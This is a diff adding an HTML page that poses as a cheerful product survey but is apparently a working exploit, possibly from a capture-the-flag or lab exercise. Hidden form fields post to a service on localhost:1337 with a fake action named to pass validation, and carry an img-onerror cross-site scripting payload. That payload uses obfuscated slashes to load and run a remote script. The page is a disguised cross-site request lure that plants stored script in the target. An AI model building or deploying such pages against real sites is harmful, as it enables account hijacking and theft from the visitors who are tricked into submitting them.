@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Survey</title>
+<style>
+body {
+    max-width: 650px;
+    margin: 40px auto;
+    padding: 0 10px;
+    font: 18px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+    color:#444
+}
+h1, h2, h3 { line-height:1.2 }
+</style>
+</head>
+<body>
+<h1>You answer survey yes? ☺️ </h1>    
+<form action="http://localhost:1337" method="post">
+    <input type="hidden" name="action" value="bogusActionToPassValidation">
+    <input type="hidden" name="payload" 
+    value="<img src='x' onerror='const s = document.createElement(`script`); s.src = `http:$$127.0.0.1:1337$js`.replaceAll(`$`, String.fromCharCode(47)); document.body.appendChild(s);'>">
+    <label>Rate our stuff</label>
+    <select name="rating">
+        <option value="rate10">10</option>
+        <option value="rate9">9</option>
+        <option value="rate8">8</option>
+        <option value="rate7">7</option>
+        <option value="rate6">6</option>
+        <option value="rate5">5</option>
+        <option value="rate4">4</option>
+        <option value="rate3">3</option>
+        <option value="rate2">2</option>
+        <option value="rate1">1</option>
+    </select>
+    <hr>
+    <input type="submit" value="Submit your answer 👍">
+</form>
+
+</body>
+</html>
